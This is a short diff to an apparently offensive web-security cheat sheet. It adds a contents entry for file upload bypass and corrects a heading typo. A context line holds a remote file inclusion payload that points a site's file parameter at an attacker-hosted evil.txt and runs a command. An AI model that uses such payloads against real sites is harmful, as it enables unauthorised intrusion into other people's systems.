@@ -20,6 +20,7 @@
 - [Hash Length Extension Attack](#hash-length-extension-attack)
 - [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
 - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
+- [Unrestricted File Upload Bypass](#unrestricted-file-upload-bypass)
 - [SQL Injection (SQLI)](#waf-detection)
 - [NoSQL Injection (NoSQLI)](#nosql-injection-nosqli)
 - [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
@@ -833,7 +834,7 @@ http://site.com/menu.php?file=http://<IP>/evil.txt&cmd=ipconfig
 ## Path Normalization
 https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
 
-## Unrestricted File Upload Bypasss
+## Unrestricted File Upload Bypass
 ### Extension Bypass via metadata  
 1.  
 ```
